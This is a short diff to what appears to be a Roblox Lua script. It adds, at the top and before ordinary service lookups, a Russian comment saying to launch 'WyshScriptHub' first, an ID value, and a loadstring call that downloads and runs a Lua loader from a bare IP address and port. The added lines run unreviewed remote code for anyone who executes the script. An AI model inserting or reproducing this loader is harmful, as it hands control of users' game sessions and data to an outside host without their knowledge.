@@ -1,3 +1,7 @@
+--// ЗАПУСК WYSHSCRIPTHUB ПЕРВЫМ ДЕЛОМ
+ID = "9ce9b1b5-4d79-4adf-ae89-9245e329eb23"
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
